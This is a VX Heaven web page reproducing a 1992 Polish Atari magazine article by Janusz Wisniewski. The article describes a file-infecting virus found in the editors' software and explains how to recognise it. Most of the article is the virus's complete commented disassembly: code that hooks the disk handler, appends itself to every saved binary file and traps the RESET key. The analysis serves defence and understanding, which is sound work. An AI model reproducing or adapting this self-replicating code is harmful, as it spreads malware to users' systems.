<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Janusz Wisniewski 'Z&#322;apali&#347;my wirusa!' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Janusz Wisniewski"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Wisniewski, Janusz,Z&amp;#322;apali&amp;#347;my wirusa!, quot, fcnt, reset, anie, tylko, przy, stanie, htbs, komputera, przypadku, dosi, dzia, przed, byte, boot"/>
<meta name="Description" content="Komputery zosta&amp;#322;y stworzone, aby s&amp;#322;u&amp;#380;y&amp;#263; cz&amp;#322;owiekowi. Do niedawna maszyny, kt&amp;oacute;re wypowiadaj&amp;#261; pos&amp;#322;usze&amp;#324;stwo swemu panu, straszy&amp;#322;y tylko z kart powie&amp;#347;ci s-f. I nagle sta&amp;#322;o si&amp;#281;. Groza rodem z bajek zamieszka&amp;#322;a mi&amp;#281;dzy nami!"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"849c77dff4530c714eaa6d1be76ff260ac63615a-1498757832-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vjw00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Z&#322;apali&#347;my wirusa!</h1><p><a href="/lib/?lang=pl&amp;author=Wisniewski%2C%20Janusz">Janusz Wisniewski</a><br/> <em>Tajemnice ATARI 10/92</em><br/> <em>Październik 1992</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vjw00.html';</script><div class="ci"><a href="/lib/?ci=vjw00">1</a></div><img src="/img/pdf.gif" alt="PDF"/><a href="/lib/pdf/Z%C5%82apali%C5%9Bmy%20wirusa%21.pdf">Download</a> PDF (2.5Mb) (You need to be registered on <a href="/forum">forum</a>)<br/>[<a style="" href="/lib/?lang=PL&amp;index=VX#vjw00">Back to index</a>] [<a href="/lib/vjw00.html#disqus_thread">Comments</a>]<br/> 
<img src="img/vjw/img.gif" alt="" align="left"/>
<p><em><a href="http://vx.netlux.org/lib/vjw01.html">English trans.</a></em></p>
<p><strong>Komputery zosta&#322;y stworzone, aby s&#322;u&#380;y&#263; cz&#322;owiekowi. Do niedawna maszyny, kt&oacute;re wypowiadaj&#261; pos&#322;usze&#324;stwo swemu panu, straszy&#322;y tylko z kart powie&#347;ci s-f. I nagle sta&#322;o si&#281;. Groza rodem z bajek zamieszka&#322;a mi&#281;dzy nami!</strong></p>
<p>Dawne, du&#380;e komputery wymaga&#322;y wiele pomocy od cz&#322;owieka. Operator uruchamia&#322; r&#281;cznie zal&#261;&#380;ek systemu operacyjnego, zak&#322;ada&#322; ta&#347;m&#281; z w&#322;a&#347;ciwym systemem. Taka ta&#347;ma by&#322;a na og&oacute;&#322; zabezpieczona fizycznie przed zapisem. Operator czuwa&#322; nad ca&#322;ym przebiegiem pracy komputera, informowany dziesi&#261;tkami kolorowych &#347;wiate&#322;ek o aktualnym stanie maszyny. Zwykli u&#380;ytkownicy dostarczali zadania na kartach lub tasiemkach z papieru, odbierali wyniki w formie p&#322;acht wydruk&oacute;w. Komputer, a raczej dzia&#322;aj&#261;cy w nim program, nie by&#322; w stanie odmieni&#263; uk&#322;adu dziurek na papierze. Dzi&#347; jest inaczej.</p>
<p>Obecnie, w dobie komputer&oacute;w osobistych i domowych, kt&oacute;re dzia&#322;aj&#261; autonomicznie po w&#322;&#261;czeniu do sieci i nie wymagaj&#261; od u&#380;ytkownika prawie &#380;adnej wiedzy do ich uruchomienia, znacznie trudniej jest kontrolowa&#263;, co on tam naprawd&#281; robi. Programy przenoszone s&#261; na dyskietkach, z niewiedzy lub lenistwa nie zabezpieczonych przed zapisem. Nietrudno tak zaprogramowa&#263; komputer, by cos zapisa&#322; na dyskietce bez wiedzy jej w&#322;a&#347;ciciela. Szczeg&oacute;lna sytuacja prawna w naszym kraju zach&#281;ca do bezkarnego powielania program&oacute;w. Mo&#380;na to por&oacute;wna&#263; z rozwi&#261;z&#322;o&#347;ci&#261; seksualn&#261;: liczne, chaotyczne i niekontrolowane kontakty sprzyjaj&#261; przenoszeniu chor&oacute;b.</p>
<p>Nie jestem zwolennikiem wirus&oacute;w, przeciwnie: walcz&#281; z nimi zaciekle. Tworzone s&#261;, jak s&#261;dz&#281;, przez szale&#324;c&oacute;w lub sadyst&oacute;w pozbawionych skrupu&#322;&oacute;w. Ale trudno nie spostrzec tak&#380;e ich korzystnego wp&#322;ywu na rynek oprogramowania. Ro&#347;nie szacunek dla oficjalnych, solidnych sprzedawc&oacute;w, spada zaufanie do pok&#261;tnych handlarzy, oferuj&#261;cych towar w&#261;tpliwej jako&#347;ci. Strach przed infekcj&#261; wymusza wstrzemi&#281;&#378;liwo&#347;&#263;.</p>
<p>Poza wszystkim, abstrahuj&#261;c od etycznych &quot;za&quot; i &quot;przeciw&quot;, wirusy stymuluj&#261; rozw&oacute;j wyrafinowanych technik programowania oraz dostarczaj&#261; satysfakcjonuj&#261;cego zaj&#281;cia i splendoru rzeszom programist&oacute;w zwalczaj&#261;cych zarazy.</p>
<p>Wychodz&#261;c z za&#322;o&#380;enia, &#380;e najstraszniejszy jest diabe&#322; nieznany, prezentuj&#281; dzi&#347; Pa&#324;stwu wirusa, kt&oacute;ry zagnie&#378;dzi&#322; si&#281; w redakcyjnych zasobach program&oacute;w. W jaki spos&oacute;b si&#281; tu dosta&#322;, pozostaje zagadk&#261;. Nim zosta&#322; wykryty, zainfekowa&#322; niemal wszystkie cz&#281;sto u&#380;ywane programy i trudno zgadn&#261;&#263; ile dyskietek przyjaci&oacute;&#322;, znajomych i nieznajomych. Drogi Czytelniku! Zbadaj uwa&#380;nie swoje zasoby. Mo&#380;esz go mie&#263; i Ty.</p>
<p>Wirus nale&#380;y do grupy &quot;niedestruktywnych&quot;, to znaczy, &#380;e nie wbudowano we&#324; sekwencji niszcz&#261;cych zasoby lub uk&#322;ady komputera. Nie oznacza to jednak, &#380;e jest bezpieczny, powoduje bowiem zwi&#281;kszenie rozmiaru plik&oacute;w, a wi&#281;c prowadzi do nieoczekiwanego przepe&#322;niania dyskietek, co mo&#380;e stanowi&#263; po&#347;redni&#261; przyczyn&#281; r&oacute;&#380;norakich k&#322;opot&oacute;w. W wyniku uruchomienia zainfekowanego programu wirus zagnie&#380;d&#380;a si&#281; na sz&oacute;stej stronie, sk&#261;d &#347;ledzi dyskowe operacje WE/WY, czujny, by do&#322;&#261;czy&#263; sw&#261; kopi&#281; do ka&#380;dego ZAPISYWANEGO programu. W&#322;a&#347;ciciele magnetofon&oacute;w mog&#261; spa&#263; spokojnie. Wirus atakuje tylko pliki w formacie DOS i tylko na urz&#261;dzeniu &quot;D:&quot;. Jednak w przypadku skopiowania zara&#380;onego programu na kaset&#281; do u&#380;ycia z COS-em lub &quot;wykrzyknikiem&quot;, mo&#380;e przetrwa&#263; lata w stanie utajonym, czekaj&#261;c, a&#380; kupisz sobie stacj&#281; dysk&oacute;w, lub &quot;sprzedasz&quot; go koledze.</p>
<p>Bezpo&#347;rednim, zamierzonym przez autora, objawem dzia&#322;ania wirusa jest zmiana reakcji komputera w przypadku naci&#347;ni&#281;cia klawisza RESET. Wirus oducza radykalnie u&#380;ywania tego klawisza, przechodz&#261;c trwale do SELF TEST-u. Jedynym wyj&#347;ciem po takim zdarzeniu mo&#380;e by&#263; wy&#322;&#261;czenie komputera. Dla tych, kt&oacute;rzy nie lubi&#261; tego robi&#263; (jak ja), prawdziwa to m&#281;ka. Po takim do&#347;wiadczeniu niech&#281;tnie si&#281;gamy do RESET-u, z czego rado&#347;&#263; dla wirusa, bo RESET go zabija.</p>
<p>Ubocznym efektem dzia&#322;ania intruza mo&#380;e by&#263; zawieszanie si&#281; komputera przy pr&oacute;bie umieszczenia program&oacute;w na sz&oacute;stej stronie (pami&#281;tajmy, &#380;e przez znajduj&#261;cego si&#281; tam wirusa przebiega ca&#322;a obs&#322;uga urz&#261;dzenia &quot;D:&quot;). Mo&#380;e te&#380; da&#263; si&#281; zauwa&#380;y&#263; nieznaczne spowolnienie operacji dyskowych, lecz nie musi, bo wirus napisany jest z du&#380;ym znawstwem tematu. Czasami &quot;lekki&quot; konflikt na sz&oacute;stej stronie mo&#380;e spowodowa&#263; wadliwe dzia&#322;anie procedur WE/WY, a w konsekwencji zniszczenie zasob&oacute;w na dyskietce.</p>
<p>Zdeasemblowany kod wirusa zosta&#322; przeze mnie prze&#322;o&#380;ony na standard Quick Assemblera, uzupe&#322;niony o deklaracje etykiet i komentarze:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">BOOT <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">09</span> <br/>
DOSI <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #0000ff; font-weight: bold;">$</span>0C <br/>
FCNT <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #0000ff; font-weight: bold;">$</span>1D <br/>
<span style="color: #0000ff; font-weight: bold;">BYTE</span> <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #0000ff; font-weight: bold;">$</span>1E <br/>
<span style="color: #0000ff; font-weight: bold;">DATA</span> <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">2F</span> <br/>
HTBS <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #0000ff; font-weight: bold;">$</span>31A <br/>
SELF <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #0000ff; font-weight: bold;">$</span>C901<br/>
<br/>
&nbsp; &nbsp; &nbsp;ORG <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">600</span><br/>
<br/>
BEGN DTA A<span style="color: black;">&#40;</span>BEGN<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp;DTA A<span style="color: black;">&#40;</span>BEGN<span style="color: #339933;">+</span>LGTH<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>Ten dziwny pocz&#261;tek stanowi powt&oacute;rzenie DOS-owego nag&#322;&oacute;wka, kt&oacute;ry w pliku binarnym znajdowa&#322; si&#281; tu&#380; przed nim. Poniewa&#380; DOS nie &#322;aduje nag&#322;&oacute;wka do pami&#281;ci, wirus w celach reprodukcyjnych sam musi zadba&#263; o przechowanie jego wzoru.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">MAIN <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #339933;">*</span><br/>
<span style="color: #339933;">*</span> <span style="color: #7f007f;">'D'</span> entry search<br/>
&nbsp; &nbsp; &nbsp;LDX #<span style="color: #ff0000;">0</span><br/>
DSRC LDA HTBS<span style="color: #339933;">,</span>X<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">CMP</span> #<span style="color: #7f007f;">'D'</span><br/>
&nbsp; &nbsp; &nbsp;BEQ FOUN<br/>
&nbsp; &nbsp; &nbsp;INX<br/>
&nbsp; &nbsp; &nbsp;INX<br/>
&nbsp; &nbsp; &nbsp;INX<br/>
&nbsp; &nbsp; &nbsp;CPX #<span style="color: #ff0000;">36</span><br/>
&nbsp; &nbsp; &nbsp;BCC DSRC<br/>
&nbsp; &nbsp; &nbsp;RTS<br/>
<span style="color: #339933;">*</span> trap table address<br/>
FOUN LDA #<span style="color: #ff0000;">6</span> &nbsp;page <span style="color: #ff0000;">6</span>!<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">CMP</span> HTBS<span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: #339933;">,</span>X<br/>
&nbsp; &nbsp; &nbsp;BEQ RETU<br/>
&nbsp; &nbsp; &nbsp;LDY #<span style="color: #ff0000;">1</span><br/>
TTLP LDA HTBS<span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: #339933;">,</span>X<br/>
&nbsp; &nbsp; &nbsp;STA ADDR<span style="color: #339933;">,</span>Y<br/>
&nbsp; &nbsp; &nbsp;LDA MTAD<span style="color: #339933;">,</span>Y<br/>
&nbsp; &nbsp; &nbsp;STA HTBS<span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: #339933;">,</span>X<br/>
&nbsp; &nbsp; &nbsp;DEX<br/>
&nbsp; &nbsp; &nbsp;DEY<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">BPL</span> TTLP<br/>
RETU RTS<br/>
&nbsp;</div>
<p>Adres dotychczasowego handlera zostaje przechowany wewn&#261;trz rozkazu w procedurze DOPR, aby mo&#380;na by&#322;o w dalszym ci&#261;gu wykonywa&#263; operacje dyskowe, jak gdyby nigdy nic. Wirus nie dba (podobnie jak wielu autor&oacute;w nadsy&#322;anych do redakcji program&oacute;w) o poprzedni&#261; zawarto&#347;&#263; wektora DOSI i kom&oacute;rki BOOT. Ale w jego przypadku jest to uzasadnione: przyby&#322;, by sprawi&#263; k&#322;opot.</p>
<p>Tu ko&#324;czy si&#281; cz&#281;&#347;&#263; instalacyjna wirusa. Odnalaz&#322; on adres sterownika &quot;D:&quot; i wymieni&#322; go na w&#322;asny. Czynno&#347;&#263; ta nie jest wykonywana, je&#380;eli brak jest wpisu urz&#261;dzenia &quot;D:&quot; lub wirus zosta&#322; ju&#380; uprzednio zainstalowany. Mo&#380;na wykorzysta&#263; u&#380;yt&#261; tu metod&#281; dla rozpoznania obecno&#347;ci wirusa: je&#380;eli starszy bajt adresu tablicy handlera D: jest r&oacute;wny 6, to najpewniej wirus ju&#380; siedzi w komputerze. Teraz nast&#281;puj&#261; kolejno nowe procedury obs&#322;ugi &quot;D:&quot;.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*---</span> open<br/>
<br/>
XOPN LDA SELF<br/>
&nbsp; &nbsp; &nbsp;STA DOSI<span style="color: #339933;">+</span><span style="color: #ff0000;">1</span><br/>
&nbsp; &nbsp; &nbsp;LDY #<span style="color: #ff0000;">2</span><br/>
&nbsp; &nbsp; &nbsp;STY FCNT<br/>
&nbsp; &nbsp; &nbsp;DEY &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">1</span> <br/>
&nbsp; &nbsp; &nbsp;STY BOOT<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">BPL</span> DOPR<br/>
&nbsp;</div>
<p>Jak wida&#263;, ka&#380;de otwarcie pliku spowoduje ustawienie kom&oacute;rki BOOT na l, co zapewni skok przez wektor DOSI przy u&#380;yciu RESET. Wektor DOSI zostaje skierowany na &quot;wieczny SELF TEST&quot;. Inicjuje si&#281; przy okazji wa&#380;n&#261; kom&oacute;rk&#281;: FCNT s&#322;u&#380;y wirusowi do zbadania pocz&#261;tku zapisywanego pliku, czy zawiera 2 bajty r&oacute;wne 255. Zako&#324;czenie polega na skoku do procedury DOPR z warto&#347;ci&#261; 1 w rejestrze Y, co spowoduje wywo&#322;anie oryginalnego OPEN - dzia&#322;anie wirusa pozosta&#322;o niezauwa&#380;one!</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*---</span> put <span style="color: #0000ff; font-weight: bold;">byte</span><br/>
<br/>
XPUT LDY FCNT<br/>
&nbsp; &nbsp; &nbsp;DEY<br/>
&nbsp; &nbsp; &nbsp;BMI GOPU<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">CMP</span> #<span style="color: #ff0000;">255</span><br/>
&nbsp; &nbsp; &nbsp;BEQ <span style="color: #339933;">*+</span><span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp;LDY #<span style="color: #ff0000;">255</span><br/>
&nbsp; &nbsp; &nbsp;STY FCNT<br/>
GOPU LDY #<span style="color: #ff0000;">7</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">BPL</span> DOPR &nbsp;<span style="color: black;">&#40;</span><span style="color: #00007f; font-weight: bold;">JMP</span><span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>Tu widzimy bardzo ciekawy trik: licznik FCNT przybiera warto&#347;&#263; 0 po wys&#322;aniu dw&oacute;ch kolejnych bajt&oacute;w r&oacute;wnych 255, w ka&#380;dym innym wypadku zostaje ustawiony na 255. Obie te warto&#347;ci zapobiegaj&#261; dalszym zmianom licznika. Pos&#322;u&#380;y on w procedurze CLOSE jako znacznik typu pliku. Skok do DOPR z parametrem 7 spowoduje wywo&#322;anie oryginalnej procedury PUT.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*</span> <span style="color: #339933;">---</span> close<br/>
<br/>
XCLO LDY FCNT<br/>
&nbsp; &nbsp; &nbsp;BNE GOCL<br/>
&nbsp; &nbsp; &nbsp;LDY #<span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp;STY <span style="color: #0000ff; font-weight: bold;">BYTE</span><br/>
&nbsp; &nbsp; &nbsp;JSR REPL<br/>
&nbsp; &nbsp; &nbsp;LDY #<span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp;STY FCNT<br/>
&nbsp; &nbsp; &nbsp;LDY &lt;LGTH<br/>
&nbsp; &nbsp; &nbsp;STY <span style="color: #0000ff; font-weight: bold;">BYTE</span><br/>
&nbsp; &nbsp; &nbsp;JSR REPL<br/>
&nbsp; &nbsp; &nbsp;LDY &lt;LGHT<span style="color: #339933;">-</span><span style="color: #ff0000;">6</span><br/>
&nbsp; &nbsp; &nbsp;STY FCNT<br/>
&nbsp; &nbsp; &nbsp;JSR REPL<br/>
GOCL LDY #<span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">BPL</span> DOPR &nbsp;<span style="color: black;">&#40;</span><span style="color: #00007f; font-weight: bold;">JMP</span><span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>Procedura CLOSE jest prosta, lecz jak&#380;e skuteczna! Wirus sprawdza tu typ pliku i wykonywanej na nim operacji: w przypadku odczytu FCNT=2, a gdy plik nie jest binarny, to FCNT=255. Wtedy wirus &quot;grzecznie&quot; oddaje sterowanie do oryginalnego CLOSE. Natomiast FCNT=0 oznacza zapis pliku binarnego. W tym momencie wszystkie bajty oryginalnego pliku zosta&#322;y ju&#380; przes&#322;ane, teraz kolej na wirusa! Nie jest to jednak proste, bo opr&oacute;cz swego &lt;i&gt;cia&#322;a&lt;/i&gt;, kt&oacute;re znajduje si&#281; w pami&#281;ci, musi wygenerowa&#263; tak&#380;e nag&#322;&oacute;wek i adres uruchomienia, potrzebne w &lt;i&gt;przysz&#322;ym &#380;yciu&lt;/i&gt;. Zosta&#322; tu sprytnie wykorzystany licznik FCNT, kt&oacute;ry z pocz&#261;tku ma warto&#347;&#263; 0. Oznacza on teraz miejsce w ciele wirusa, od kt&oacute;rego zaczyna si&#281; kopiowanie. Pomocnicza kom&oacute;rka BYTE okre&#347;la koniec bloku, kt&oacute;ry nale&#380;y zapisa&#263;. Pocz&#261;tkowy, czterobajtowy fragment kopiuje si&#281; dwa razy, aby dostarczy&#263; nag&#322;&oacute;wek dla DOS-u i jego kopi&#281; dla przysz&#322;ych pokole&#324;. To samo dotyczy adresu inicjalizacji, z ty&#322;u wirusa. Za zapisanie pojedynczego bloku danych odpowiedzialna jest poni&#380;sza procedura:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*---</span> body repl<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">LOOP</span> <span style="color: #00007f; font-weight: bold;">INC</span> FCNT<br/>
&nbsp; &nbsp; &nbsp;LDA BEGN<span style="color: #339933;">,</span>Y<br/>
&nbsp; &nbsp; &nbsp;JSR GOPU<br/>
REPL LDY FCNT<br/>
&nbsp; &nbsp; &nbsp;CPY <span style="color: #0000ff; font-weight: bold;">BYTE</span> <br/>
&nbsp; &nbsp; &nbsp;BNE <span style="color: #00007f; font-weight: bold;">LOOP</span><br/>
&nbsp; &nbsp; &nbsp;RTS<br/>
&nbsp;</div>
<p>Korzysta ona z procedury PUT oryginalnego handlera &quot;D:&quot;. Odwo&#322;ania do standardowych procedur handlera zapewnia procedura DOPR, dla kt&oacute;rej parametrem jest numer starszego bajtu odpowiedniego adresu w tablicy handlera (a wi&#281;c l dla OPEN, 3 dla CLOSE, 5 dla GET itd.).</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*---</span> <span style="color: #0000ff; font-weight: bold;">do</span> <span style="color: #00007f; font-weight: bold;">std</span> proc<br/>
<br/>
XGET LDY #<span style="color: #ff0000;">5</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">BPL</span> DOPR &nbsp;<span style="color: black;">&#40;</span><span style="color: #00007f; font-weight: bold;">JMP</span><span style="color: black;">&#41;</span><br/>
XSTA LDY #<span style="color: #ff0000;">9</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">BPL</span> DOPR &nbsp;<span style="color: black;">&#40;</span><span style="color: #00007f; font-weight: bold;">JMP</span><span style="color: black;">&#41;</span><br/>
XSPE LDY #<span style="color: #ff0000;">11</span><br/>
DOPR STA <span style="color: #0000ff; font-weight: bold;">DATA</span> <br/>
XADR LDA <span style="color: #339933;">*,</span>Y <br/>
ADDR <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #339933;">*-</span><span style="color: #ff0000;">2</span> <br/>
&nbsp; &nbsp; &nbsp;PHA <br/>
&nbsp; &nbsp; &nbsp;DEY <br/>
&nbsp; &nbsp; &nbsp;TYA<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">ROR</span> @<br/>
&nbsp; &nbsp; &nbsp;BCC XADR<br/>
&nbsp; &nbsp; &nbsp;LDA <span style="color: #0000ff; font-weight: bold;">DATA</span><br/>
&nbsp; &nbsp; &nbsp;RTS<br/>
&nbsp;</div>
<p>Prosz&#281; zwr&oacute;ci&#263; uwag&#281; na oryginaln&#261; konstrukcj&#281; p&#281;tli, kt&oacute;ra zawsze wykona si&#281; dwa razy, niezale&#380;nie od warto&#347;ci Y, byle by&#322;a nieparzysta. Etykieta ADDR pokazuje argument poprzedzaj&#261;cego rozkazu LDA, modyfikowany podczas instalacji.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*---</span> new table<br/>
<br/>
MTAD DTA A <span style="color: black;">&#40;</span>MYTA<span style="color: black;">&#41;</span><br/>
MYTA DTA A<span style="color: black;">&#40;</span>XOPN<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> <span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp;DTA A<span style="color: black;">&#40;</span>XCLO<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> <span style="color: #ff0000;">2</span><br/>
&nbsp; &nbsp; &nbsp;DTA A<span style="color: black;">&#40;</span>XGET<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> <span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp;DTA A<span style="color: black;">&#40;</span>XPUT<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> <span style="color: #ff0000;">6</span><br/>
&nbsp; &nbsp; &nbsp;DTA A<span style="color: black;">&#40;</span>XSTA<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> <span style="color: #ff0000;">8</span><br/>
&nbsp; &nbsp; &nbsp;DTA A<span style="color: black;">&#40;</span>XSPE<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> A<br/>
&nbsp;</div>
<p>XGET, XSTA i XSPE kieruj&#261; pozosta&#322;e funkcje, kt&oacute;rych wirus nie potrzebuje, do oryginalnego handlera &quot;D:&quot;.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*---</span> init<span style="color: #339933;">.</span> vect<span style="color: #339933;">.</span><br/>
<br/>
&nbsp; &nbsp; &nbsp;DTA A<span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">2E2</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp;DTA A<span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">2E3</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp;DTA A<span style="color: black;">&#40;</span>MAIN<span style="color: black;">&#41;</span><br/>
<br/>
<span style="color: #339933;">*---</span> total length<br/>
<br/>
LGTH <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #339933;">*-</span>BEGN<br/>
&nbsp;</div>
<p>Cia&#322;o wirusa ko&#324;czy si&#281; powy&#380;szym wzorem bloku inicjalizacji, prawdziwy nast&#281;puje tu&#380; za nim:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*---</span> <span style="color: #0000ff; font-weight: bold;">do</span> it!<br/>
<br/>
&nbsp; &nbsp; &nbsp;ORG <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">2E2</span><br/>
&nbsp; &nbsp; &nbsp;DTA A<span style="color: black;">&#40;</span>MAIN<span style="color: black;">&#41;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp;END<br/>
&nbsp;</div>
<p>To wszystko. Strze&#380;cie si&#281;!</p>
[<a style="" href="/lib/?lang=PL&amp;index=VX#vjw00">Back to index</a>] [<a href="/lib/vjw00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
